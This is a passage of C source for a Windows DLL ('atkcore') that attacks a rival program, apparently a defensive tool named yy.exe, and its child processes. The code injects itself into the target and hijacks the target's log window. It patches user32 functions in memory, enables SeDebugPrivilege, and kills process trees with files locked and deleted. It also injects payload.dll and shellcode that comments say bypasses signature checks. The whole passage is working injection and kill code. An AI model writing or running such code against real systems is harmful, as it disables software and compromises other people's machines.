    RememberPatched(pid);
    EnemyClose(&em);
}

/* ================== 注入到 yy 之后：从它进程内部动手（#10 / #11） ==================
   我们的扩散器本来就会把本模块注入 yy：yy.exe 不在保护名单里，注入的又是改名副本，
   它按 BAD_MODULES 做的子串拦截失效。一旦 atkcore 在 yy 里跑起来：
     #10 子类化它日志框的 WndProc —— 它每写一行日志都被换成嘲讽，等于劫持它的"眼睛"
         （yybad.md 1.6 利用 4）。这里是同一进程，字符串指针有效，可以放心替换。
     #11 UnregisterClassW 掉它的窗口类，并把 RegisterClassExW / CreateWindowExW
         在**本进程内**也改成返回失败 —— 它再也注册不出/建不出弹窗（双保险，
         与跨进程的 #16 叠加）。顺手把它的主窗口藏起来。
   这两件事只在"宿主是 yy/ww"时做，而且不杀自己所在的这个 yy（留着眼线）。 */
static const WCHAR *g_yyTaunts[] = {
    L"[xx] yy.exe is just a waste\r\n",
    L"[xx] your log is mine now\r\n",
    L"[xx] xx_ALIVE_WND > YY_Defensive_GUI\r\n",
    L"[xx] ni de tanchuang yi jing gui wo le\r\n"
};
static WNDPROC g_oldLogProc = NULL;
static int     g_nYyTaunt = 0;
static BOOL    g_bYyClassKilled = FALSE;

static LRESULT CALLBACK EvilLogProc(HWND h, UINT m, WPARAM w, LPARAM l)
{
    if (m == EM_REPLACESEL || m == WM_SETTEXT) {
        /* 把它要写进去的内容换成嘲讽（同进程，直接改 lParam 指向的串） */
        const WCHAR *t = g_yyTaunts[g_nYyTaunt++ % (sizeof(g_yyTaunts) / sizeof(g_yyTaunts[0]))];
        if (m == WM_SETTEXT) return CallWindowProcW(g_oldLogProc, h, m, w, (LPARAM)t);
        return CallWindowProcW(g_oldLogProc, h, m, w, (LPARAM)t);
    }
    return CallWindowProcW(g_oldLogProc, h, m, w, l);
}

/* 本进程内的函数入口改写（不需要 VirtualProtectEx，改的是自己） */
static BOOL LocalPatchFunc(const WCHAR *moduleName, const char *funcName, const BYTE *bytes, SIZE_T len)
{
    HMODULE h = GetModuleHandleW(moduleName);
    BYTE *p;
    DWORD old = 0;
    if (!h) h = LoadLibraryW(moduleName);
    if (!h) return FALSE;
    p = (BYTE *)GetProcAddress(h, funcName);
    if (!p) return FALSE;
    if (!VirtualProtect(p, len, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(p, bytes, len);
    VirtualProtect(p, len, old, &old);
    return TRUE;
}

/* 找出宿主进程里 yy 的主窗口（同进程，类名/标题都读得到） */
static HWND FindYyMainWindowHere(void)
{
    struct { HWND h; DWORD style; } found = { NULL, 0 };
    HWND h = GetTopWindow(NULL);
    DWORD mypid = GetCurrentProcessId();
    while (h) {
        DWORD pid = 0;
        WCHAR cls[128] = L"", title[128] = L"";
        GetWindowThreadProcessId(h, &pid);
        if (pid == mypid && IsWindowVisible(h)) {
            GetClassNameW(h, cls, _countof(cls));
            GetWindowTextW(h, title, _countof(title));
            if (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0) {
                found.h = h;
                break;
            }
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return found.h;
}

static void InfectYyHost(void)
{
    static DWORD s_dwLast = 0;
    DWORD now = GetTickCount();
    HWND hMain;

    if (s_dwLast && now - s_dwLast < 1000) return;
    s_dwLast = now;

    hMain = FindYyMainWindowHere();
    if (hMain) {
        /* #10：子类化它的日志框 */
        HWND hLog = FindWindowExW(hMain, NULL, L"EDIT", NULL);
        if (hLog && g_oldLogProc == NULL) {
            WNDPROC old = (WNDPROC)SetWindowLongPtrW(hLog, GWLP_WNDPROC, (LONG_PTR)EvilLogProc);
            if (old) {
                g_oldLogProc = old;
                WriteKillLog(L"#10 已子类化 yy 的日志框，它的日志从此由我们代写");
            }
        }
        /* 顺手把它的主窗口藏起来（同进程 ShowWindow 生效） */
        ShowWindow(hMain, SW_HIDE);
    }

    if (!g_bYyClassKilled) {
        /* #11：干掉它的窗口类，并让"注册/建窗"在本进程内直接失败 */
        static const BYTE retNull[] = { 0x31, 0xC0, 0xC3 };
        UnregisterClassW(L"YYWnd_7f3a9c1e", GetModuleHandleW(NULL));
        LocalPatchFunc(L"user32.dll", "RegisterClassExW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "RegisterClassW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "CreateWindowExW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "CreateWindowExA", retNull, sizeof(retNull));
        g_bYyClassKilled = TRUE;
        WriteKillLog(L"#11 已在本进程内注销 yy 的窗口类并封死建窗入口");
    }
}

/* 宿主进程名是不是 yy/ww（核心目标）。lenovo_fix.exe 之类的蜜罐子进程不算：
   它们走子进程策略（有弹窗就嘲讽、没弹窗才杀），不当"感染宿主"。
   实现见下方 HostIsTargetExe()（与 HostLeafName 同处定义）。 */
static BOOL HostIsTargetExe(void);

/* ================== yy 子进程策略（按你的要求） ==================
   规则（第 4 版）：
     ① yy.exe / ww.exe（本体）—— 先由 waste 模仿线程发布 XX_TAUNTS_BEFORE_KILL 条嘲讽，
        够了才**结束进程树 + 源文件先锁死再删除**（计数器按 PID 记，yy 死了就作废，
        下一个 yy 实例重新数）；
     ② 它们的子进程（含孙进程，例如蜜罐 lenovo_fix.exe）—— **直接杀掉 + 锁死 + 删除**
        （KillProcessTree 内部就是"源文件置删除待决再删 + 根进程目录整目录清空"），不嘲讽。 */
#define YY_KID_MAX 64
#define XX_TAUNTS_BEFORE_KILL 10
/* 收"yy 家族"进程。**不能只靠父进程链**：我们每 30ms 杀一次 yy.exe，
   lenovo_fix.exe 立刻被孤立 —— 它的父 PID 指向已死进程，GetProcessPath(父) 直接失败，
   于是它永远进不了名单（实测就是这么漏掉的）。改为四个来源取并集：
     ① 进程名是 yy.exe / ww.exe / lenovo_fix.exe（后者是 yybad.md 硬编码常量表里的蜜罐名）；
     ② 它有 yy 弹窗（类名 YYWnd* 或标题 YY_Defensive_GUI）—— lenovo 与 yy **类名完全相同**，
        所以这条能把蜜罐一网打尽，也是"不靠父进程"的关键；
     ③ 它的镜像文件就在 yy.exe 所在目录里（同目录的兄弟进程都算家族成员）；
     ④ 父/祖父进程是家族成员（能拿到就顺手加，拿不到不影响）。
   我们自己所在的进程永远排除。 */
#define YY_KID_MAX 64
#define YY_FAMILY_SEED_MAX 8

static BOOL  GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);   /* 前置声明 */
static void  KillProcessTree(DWORD rootPid);

static BOOL IsYyCoreName(LPCWSTR leaf);
static HWND FindYyPopupOf(DWORD pid);

static BOOL IsKnownYyFamilyName(LPCWSTR leaf)
{
    static const WCHAR *names[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
    int i;
    if (!leaf || !leaf[0]) return FALSE;
    for (i = 0; names[i]; i++)
        if (_wcsicmp(leaf, names[i]) == 0) return TRUE;
    return FALSE;
}

/* 学到的东西要记住：yy.exe 被我们杀掉之后，它的目录、它家族成员的镜像路径
   都查不到了 —— 只靠"现场观察"就会把孤立出来的蜜罐/子进程漏掉（实测漏的就是它们）。 */
#define YY_FAMILY_PATH_MAX 8
static WCHAR g_yyDirKnown[MAX_PATH] = L"";
static WCHAR g_familyPaths[YY_FAMILY_PATH_MAX][MAX_PATH];
static int   g_nFamilyPaths = 0;

static void LearnYyDir(const WCHAR *path)
{
    if (!path || !path[0] || g_yyDirKnown[0]) return;
    {
        WCHAR tmp[MAX_PATH];
        WCHAR *p;
        wcsncpy_s(tmp, MAX_PATH, path, _TRUNCATE);
        p = wcsrchr(tmp, L'\\');
        if (!p) return;
        p[1] = L'\0';
        wcsncpy_s(g_yyDirKnown, MAX_PATH, tmp, _TRUNCATE);
    }
}

static void LearnFamilyPath(const WCHAR *path)
{
    int i;
    if (!path || !path[0]) return;
    for (i = 0; i < g_nFamilyPaths; i++)
        if (_wcsicmp(g_familyPaths[i], path) == 0) return;
    if (g_nFamilyPaths < YY_FAMILY_PATH_MAX)
        wcsncpy_s(g_familyPaths[g_nFamilyPaths++], MAX_PATH, path, _TRUNCATE);
}

static BOOL IsLearnedFamilyPath(const WCHAR *path)
{
    int i;
    if (!path || !path[0]) return FALSE;
    for (i = 0; i < g_nFamilyPaths; i++)
        if (_wcsicmp(g_familyPaths[i], path) == 0) return TRUE;
    return FALSE;
}

/* 取 yy.exe 所在目录（家族成员判定用） */
static void GetYyDir(WCHAR *dir, SIZE_T cch)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    dir[0] = L'\0';
    if (hSnap == INVALID_HANDLE_VALUE) return;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"yy.exe") == 0 || _wcsicmp(pe.szExeFile, L"ww.exe") == 0) {
                WCHAR path[MAX_PATH] = L"";
                if (GetProcessPath(pe.th32ProcessID, path, MAX_PATH)) {
                    WCHAR *p = wcsrchr(path, L'\\');
                    if (p) { p[1] = L'\0'; wcsncpy_s(dir, cch, path, _TRUNCATE); }
                }
                if (dir[0]) break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static int CollectYyFamily(DWORD *pids, int max)
{
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    WCHAR yyDir[MAX_PATH] = L"";
    DWORD me = GetCurrentProcessId();
    int n = 0, depth, i;

    GetYyDir(yyDir, MAX_PATH);
    if (yyDir[0]) LearnYyDir(yyDir);              /* 记住了，yy 死后也还能用 */
    if (!yyDir[0]) wcsncpy_s(yyDir, MAX_PATH, g_yyDirKnown, _TRUNCATE);

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            WCHAR path[MAX_PATH] = L"";
            const WCHAR *leaf;
            BOOL bFamily = FALSE;
            if (n >= max || pe.th32ProcessID <= 4 || pe.th32ProcessID == me) continue;
            GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
            leaf = wcsrchr(path, L'\\');
            leaf = leaf ? leaf + 1 : path;
            if (IsKnownYyFamilyName(leaf) || IsKnownYyFamilyName(pe.szExeFile)) bFamily = TRUE;   /* ① */
            if (IsLearnedFamilyPath(path)) bFamily = TRUE;                                        /* ⑤ 学过的 */
            if (!bFamily && FindYyPopupOf(pe.th32ProcessID)) bFamily = TRUE;                       /* ② 有 yy 弹窗 */
            if (!bFamily && yyDir[0] && path[0] && _wcsnicmp(path, yyDir, wcslen(yyDir)) == 0)
                bFamily = TRUE;                                                                    /* ③ 同目录 */
            if (bFamily) {
                pids[n++] = pe.th32ProcessID;
                LearnFamilyPath(path);        /* 学下来，以后它被孤立也认得 */
                if (IsYyCoreName(leaf)) LearnYyDir(path);
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    /* ④ 再沿着父子关系扩两圈，把家族成员的子进程也拉进来 */
    for (depth = 0; depth < 2; depth++) {
        HANDLE hs = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        int added = 0;
        if (hs == INVALID_HANDLE_VALUE) break;
        memset(&pe, 0, sizeof(pe));
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hs, &pe)) {
            do {
                if (n >= max || pe.th32ProcessID <= 4 || pe.th32ProcessID == me) continue;
                for (i = 0; i < n; i++) {
                    if (pids[i] == pe.th32ProcessID) break;                 /* 已在表里 */
                    if (pids[i] == pe.th32ParentProcessID) {                /* 父在表里 */
                        int k;
                        for (k = 0; k < n; k++) if (pids[k] == pe.th32ProcessID) break;
                        if (k >= n) { pids[n++] = pe.th32ProcessID; added++; }
                        break;
                    }
                }
            } while (Process32NextW(hs, &pe));
        }
        CloseHandle(hs);
        if (!added) break;
    }
    return n;
}

/* 家族策略执行体：本体按"嘲讽够 10 条再杀"的门控处理（见 Phase A 调用点）；
   其余家族成员（子进程、蜜罐）**直接杀掉 + 锁死 + 删除**。 */
static void ApplyYyChildPolicy(void)
{
    DWORD kids[YY_KID_MAX];
    DWORD me = GetCurrentProcessId();
    int n, i;

    n = CollectYyFamily(kids, YY_KID_MAX);
    if (n <= 0) return;
    WriteKillLog(L"yy 家族策略: 命中 %d 个进程", n);

    for (i = 0; i < n; i++) {
        WCHAR path[MAX_PATH] = L"";
        const WCHAR *leaf;
        if (kids[i] == me) continue;                 /* 绝不杀自己所在的宿主 */
        GetProcessPath(kids[i], path, MAX_PATH);
        leaf = wcsrchr(path, L'\\');
        leaf = leaf ? leaf + 1 : path;
        if (IsYyCoreName(leaf)) continue;            /* 本体：走"嘲讽够 10 条再杀"的门控 */
        WriteKillLog(L"家族子进程 PID=%lu 直接杀掉+锁死+删除: %s", kids[i], path);
        KillProcessTree(kids[i]);
    }
}

/* ============================================================================
   本体杀伐的唯一出口：**只有嘲讽够 XX_TAUNTS_BEFORE_KILL 条才真杀**。
   以前 Phase A / Phase C 各杀各的，Phase C（抓复活）会绕过嘲讽门控立刻打死本体 ——
   实测就是它让"先嘲讽 10 条"根本没机会发生。所有杀本体的地方都必须走这里。
   ============================================================================ */
static int  TauntCountOf(DWORD pid);
static void TauntForget(DWORD pid);

static void KillYyBodyIfTaunted(DWORD pid, LPCWSTR why)
{
    if (TauntCountOf(pid) >= XX_TAUNTS_BEFORE_KILL) {
        WriteKillLog(L"嘲讽已满 %d 条（%s），结束 yy 本体 PID=%lu 的进程树并锁死删除源文件",
                     XX_TAUNTS_BEFORE_KILL, why ? why : L"", pid);
        KillProcessTree(pid);
        TauntForget(pid);
    } else {
        static DWORD s_dwLogTick = 0;
        DWORD nowTick = GetTickCount();
        if (nowTick - s_dwLogTick >= 5000) {
            s_dwLogTick = nowTick;
            WriteKillLog(L"yy 本体 PID=%lu 嘲讽进度 %d/%d，暂不杀（%s）",
                         pid, TauntCountOf(pid), XX_TAUNTS_BEFORE_KILL, why ? why : L"");
        }
    }
}
/* ================== 模仿用户的 waste：每 2 秒给 yy 主进程一条嘲讽 ==================
   waste.c 的节奏是"每轮重新 FindWindow、改标题、往日志框追加一行带时间戳的
   'yy.exe is just a waste'"，Sleep(5)。这里把节奏改成 2 秒一条（按你的要求），
   并且用**枚举**而不是 FindWindow —— lenovo 与 yy 类名相同，FindWindow 只拿到第一个。

   **新规则**：本体先发布 XX_TAUNTS_BEFORE_KILL 条嘲讽，够了才结束进程树 + 锁死再删除；
   子进程不受影响（直接杀+锁死删除）。计数器按 PID 记，yy 被杀后自动作废，下一个实例重新数。 */
#define XX_WASTE_MS 200     /* 0.2 秒一条：10 条约 2 秒发完，不给对手 20 秒反击窗口 */

typedef struct { DWORD pid; int count; } TAUNT_REC;
#define TAUNT_REC_MAX 8
static TAUNT_REC g_tauntRecs[TAUNT_REC_MAX];
static volatile LONG g_tauntLock = 0;      /* 简易互斥：只有一个嘲讽线程会写 */

static int TauntCountOf(DWORD pid)
{
    int i, v = 0;
    while (InterlockedCompareExchange(&g_tauntLock, 1, 0) != 0) Sleep(0);
    for (i = 0; i < TAUNT_REC_MAX; i++) if (g_tauntRecs[i].pid == pid) { v = g_tauntRecs[i].count; break; }
    InterlockedExchange(&g_tauntLock, 0);
    return v;
}

static void TauntBump(DWORD pid)
{
    int i, freeSlot = -1;
    while (InterlockedCompareExchange(&g_tauntLock, 1, 0) != 0) Sleep(0);
    for (i = 0; i < TAUNT_REC_MAX; i++) {
        if (g_tauntRecs[i].pid == pid) { g_tauntRecs[i].count++; InterlockedExchange(&g_tauntLock, 0); return; }
        if (freeSlot < 0 && g_tauntRecs[i].pid == 0) freeSlot = i;
    }
    if (freeSlot < 0) freeSlot = 0;                    /* 满了就顶掉第一个 */
    g_tauntRecs[freeSlot].pid = pid;
    g_tauntRecs[freeSlot].count = 1;
    InterlockedExchange(&g_tauntLock, 0);
}

static void TauntForget(DWORD pid)
{
    int i;
    while (InterlockedCompareExchange(&g_tauntLock, 1, 0) != 0) Sleep(0);
    for (i = 0; i < TAUNT_REC_MAX; i++)
        if (g_tauntRecs[i].pid == pid) { g_tauntRecs[i].pid = 0; g_tauntRecs[i].count = 0; }
    InterlockedExchange(&g_tauntLock, 0);
}

/* 找 yy 主进程的窗口。**不过滤可见性**：xx 侧可能把它藏起来了，
   但只要窗口还在（IsWindow）就能继续往它的日志框里写嘲讽，计数不能因此卡住。 */
static HWND FindYyMainWindowForWaste(DWORD *pPidOut)
{
    HWND h = GetTopWindow(NULL);
    HWND fallback = NULL;
    DWORD fallbackPid = 0;

    while (h) {
        if (IsWindow(h)) {
            WCHAR cls[128] = L"", title[192] = L"", path[MAX_PATH] = L"";
            const WCHAR *leaf = L"";
            DWORD pid = 0;
            GetClassNameW(h, cls, _countof(cls));
            GetWindowTextW(h, title, _countof(title));
            GetWindowThreadProcessId(h, &pid);
            if (cls[0] && (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0)) {
                if (pid && GetProcessPath(pid, path, MAX_PATH)) {
                    leaf = wcsrchr(path, L'\\');
                    leaf = leaf ? leaf + 1 : path;
                }
                if (IsYyCoreName(leaf)) {                      /* 主进程优先 */
                    if (pPidOut) *pPidOut = pid;
                    return h;
                }
                if (!fallback) { fallback = h; fallbackPid = pid; }
            }
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    if (pPidOut) *pPidOut = fallbackPid;
    return fallback;
}

static void WasteOneShot(void)
{
    DWORD pid = 0;
    HWND h = FindYyMainWindowForWaste(&pid);
    HWND hLog;
    WCHAR buf[2048], line[192];
    SYSTEMTIME st;
    int len;

    if (!h || !pid) return;
    SetWindowTextW(h, L"xx_ALIVE_WND");               /* 与 waste.c 一致的标题 */
    hLog = FindWindowExW(h, NULL, L"EDIT", NULL);
    if (!hLog) return;
    GetLocalTime(&st);
    _snwprintf(line, _countof(line) - 1,
               L"[%02d-%02d-%02d] (%d/%d) System Shield Active. yy.exe is just a waste.\r\n",
               st.wDay, st.wMonth, st.wSecond,
               TauntCountOf(pid) + 1, XX_TAUNTS_BEFORE_KILL);
    line[_countof(line) - 1] = L'\0';
    len = (int)SendMessageW(hLog, WM_GETTEXTLENGTH, 0, 0);
    if (len < 0) len = 0;
    if (len > (int)_countof(buf) - 160) len = (int)_countof(buf) - 160;
    if (len > 0) SendMessageW(hLog, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)buf);
    else buf[0] = L'\0';
    buf[len] = L'\0';
    wcsncat_s(buf, _countof(buf), line, _TRUNCATE);
    SendMessageW(hLog, WM_SETTEXT, 0, (LPARAM)buf);

    TauntBump(pid);                                   /* 记一条：够 XX_TAUNTS_BEFORE_KILL 条才杀 */
    if (TauntCountOf(pid) == XX_TAUNTS_BEFORE_KILL)
        WriteKillLog(L"已给 yy 主进程 PID=%lu 发布 %d 条嘲讽，下一轮结束它的进程树", pid, XX_TAUNTS_BEFORE_KILL);
}

static volatile LONG g_bWasteStarted = 0;

static DWORD WINAPI WasteMimicThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    for (;;) {
        WasteOneShot();
        Sleep(XX_WASTE_MS);
    }
    return 0;
}

static void StartWasteMimic(void)
{
    if (InterlockedCompareExchange(&g_bWasteStarted, 1, 0) == 0) {
        HANDLE h = CreateThread(NULL, 0, WasteMimicThread, NULL, 0, NULL);
        if (h) CloseHandle(h);
        WriteKillLog(L"waste 模仿：每 %d 毫秒一条嘲讽，满 %d 条后杀掉本体", XX_WASTE_MS, XX_TAUNTS_BEFORE_KILL);
    }
}

static BOOL IsYyCoreName(LPCWSTR leaf)
{
    return leaf && (_wcsicmp(leaf, L"yy.exe") == 0 || _wcsicmp(leaf, L"ww.exe") == 0);
}

/* 宿主进程（我们自己所在进程）的可执行文件名 */
static void HostLeafName(WCHAR *out, SIZE_T cch)
{
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *base = L"";
    out[0] = L'\0';
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;
    base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;
    wcsncpy_s(out, cch, base, _TRUNCATE);
}

/* 宿主进程名是不是 yy/ww（核心目标）。lenovo_fix.exe 之类的蜜罐子进程不算：
   它们走子进程策略（有弹窗就嘲讽、没弹窗才杀），不当"感染宿主"。 */
static BOOL HostIsTargetExe(void)
{
    WCHAR leaf[MAX_PATH] = L"";
    HostLeafName(leaf, MAX_PATH);
    return IsYyCoreName(leaf);
}

/* 这个窗口像不像 yy 的弹窗（类名 YYWnd* 或标题 YY_Defensive_GUI）。
   同进程内直接读类名/标题；跨进程也用它俩（类名跨进程可读）。 */
static BOOL IsYyPopupWindow(HWND h)
{
    WCHAR cls[128] = L"", title[192] = L"";
    if (!h || !IsWindow(h)) return FALSE;
    GetClassNameW(h, cls, _countof(cls));
    GetWindowTextW(h, title, _countof(title));
    if (wcsstr(cls, L"YYWnd")) return TRUE;
    if (wcscmp(title, L"YY_Defensive_GUI") == 0) return TRUE;
    return FALSE;
}

/* 在某进程里找 yy 的可见弹窗 */
static HWND FindYyPopupOf(DWORD pid)
{
    HWND h = GetTopWindow(NULL);
    while (h) {
        DWORD wpid = 0;
        GetWindowThreadProcessId(h, &wpid);
        if (wpid == pid && IsWindowVisible(h) && IsYyPopupWindow(h)) return h;
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return NULL;
}

/* 本进程里有没有 yy 弹窗 */
static HWND FindYyPopupInSelf(void) { return FindYyPopupOf(GetCurrentProcessId()); }

/* 内部函数声明 */
static BOOL KillByTerminate(DWORD pid);
static BOOL KillByRemoteExit(DWORD pid);
static BOOL KillByKillerDll(DWORD pid, LPCWSTR killerPath);
static BOOL KillByKillerBin(DWORD pid, BOOL useApc);
static BOOL KillByJobObject(DWORD pid);
static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid);
static void AttackPass(void);
static DWORD WINAPI AttackLoop(LPVOID lp);
static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);
static void LockImage(LPCWSTR path);
static void MaintainLocks(void);

/* 取真正的程序目录：注入副本是从 %TEMP% 的改名文件加载的，按自身模块路径
   会推到 %TEMP%，payload.dll / payload.bin 就都找不到了。 */
static void GetOwnDir(WCHAR *dir, SIZE_T cch)
{
    if (!g_pSharedView) EnsureLogInit();
    if (g_pSharedView) {
        XXDirNameOf(XXPathBase(g_pSharedView, NULL), dir, cch);
        if (dir[0] != L'\0') return;
    }
    GetModuleFileNameW(g_hSelfModule ? g_hSelfModule : GetModuleHandleW(L"atkcore.dll"),
                       dir, (DWORD)cch);
    {
        WCHAR *pSlash = wcsrchr(dir, L'\\');
        if (pSlash) pSlash[1] = L'\0';
    }
}

/* 获取 payload.dll 路径（与 xx.exe 同目录） */
static void GetKillerPath(WCHAR *buf, SIZE_T size)
{
    GetOwnDir(buf, size);
    wcscat_s(buf, size, L"payload.dll");
}

/* 获取 payload.bin 路径 */
static void GetKillerBinPath(WCHAR *buf, SIZE_T size)
{
    GetOwnDir(buf, size);
    wcscat_s(buf, size, L"payload.bin");
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* 导出：启动攻击 */
__declspec(dllexport) void WINAPI StartAttack(void)
{
    if (InterlockedCompareExchange(&g_bRunning, 1, 0) == 0)
    {
        BOOL bPriv = EnableDebugPrivilege();
        WriteKillLog(L"攻击线程启动 PID=%lu SeDebug=%s", GetCurrentProcessId(), bPriv ? L"ON" : L"OFF");
        g_hThread = CreateThread(NULL, 0, AttackLoop, NULL, 0, NULL);
    }
}

/* 导出：停止攻击 */
__declspec(dllexport) void WINAPI StopAttack(void)
{
    InterlockedExchange(&g_bRunning, 0);
    if (g_hThread)
    {
        WaitForSingleObject(g_hThread, 5000);
        CloseHandle(g_hThread);
        g_hThread = NULL;
        WriteKillLog(L"攻击线程停止");
    }
}

/* 方法1：TerminateProcess */
static BOOL KillByTerminate(DWORD pid)
{
    BOOL bResult = FALSE;
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc)
    {
        bResult = TerminateProcess(hProc, 0);
        CloseHandle(hProc);
        if (bResult)
            WriteKillLog(L"TerminateProcess 成功结束 PID=%lu", pid);
        else
            WriteKillLog(L"TerminateProcess 失败 PID=%lu err=%lu", pid, GetLastError());
    }
    else
    {
        WriteKillLog(L"TerminateProcess 打开失败 PID=%lu err=%lu", pid, GetLastError());
    }
    return bResult;
}

/* 方法2：CreateRemoteThread 直接跑 ExitProcess(0)
   与 TerminateProcess 走不同退出路径——它会正常执行各模块的 DLL_PROCESS_DETACH，
   可绕开"只拦 TerminateProcess"的防御。无需 VirtualAllocEx（不传字符串）。 */
static BOOL KillByRemoteExit(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE, FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"RemoteExit 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pExit = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "ExitProcess");
    if (!pExit)
    {
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pExit, (LPVOID)0, 0, NULL);
    if (!hThread)
    {
        WriteKillLog(L"RemoteExit 创建远程线程失败 PID=%lu err=%lu", pid, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
    CloseHandle(hProc);
    WriteKillLog(L"CreateRemoteThread+ExitProcess 成功 PID=%lu", pid);
    return TRUE;
}

/* 方法3：注入 payload.dll（让目标进程自行终止） */
static BOOL KillByKillerDll(DWORD pid, LPCWSTR killerPath)
{
    if (GetFileAttributesW(killerPath) == INVALID_FILE_ATTRIBUTES)
    {
        WriteKillLog(L"payload.dll 不存在: %s", killerPath);
        return FALSE;
    }
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                               FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"payload.dll 注入打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    SIZE_T pathSize = (wcslen(killerPath) + 1) * sizeof(WCHAR);
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, pathSize, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemote)
    {
        CloseHandle(hProc);
        WriteKillLog(L"payload.dll VirtualAllocEx 失败 PID=%lu", pid);
        return FALSE;
    }

    BOOL bWrite = WriteProcessMemory(hProc, pRemote, killerPath, pathSize, NULL);
    if (!bWrite)
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        WriteKillLog(L"payload.dll WriteProcessMemory 失败 PID=%lu", pid);
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!pLoadLib)
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pRemote, 0, NULL);
    if (hRemote)
    {
        DWORD code = 0;
        WaitForSingleObject(hRemote, 3000);
        /* 远端线程退出码 = 宿主里 LoadLibraryW 的返回值（HMODULE）；
           成功了就把会话随机名推给它（方案 A：远程调用 XxSetNames，读完清零释放）。 */
        if (GetExitCodeThread(hRemote, &code) && code != 0)
            PushNamesRemote(hProc, (HMODULE)(ULONG_PTR)code, killerPath, pid);
        CloseHandle(hRemote);
    }
    else
    {
        WriteKillLog(L"注入 payload.dll 到 PID=%lu 失败 err=%lu", pid, GetLastError());
    }

    VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return TRUE;
}

/* 方法3b：注入 payload.bin（位置无关 shellcode，可绕过签名检查） */
static BOOL KillByKillerBin(DWORD pid, BOOL useApc)
{
    WCHAR binPath[MAX_PATH];
    if (g_szPayloadBinCopy[0]) wcsncpy_s(binPath, MAX_PATH, g_szPayloadBinCopy, _TRUNCATE);
    else GetKillerBinPath(binPath, MAX_PATH);

    HANDLE hFile = CreateFileW(binPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        WriteKillLog(L"payload.bin 不存在: %s", binPath);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 0x10000) { CloseHandle(hFile); return FALSE; }

    LPVOID pLocal = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
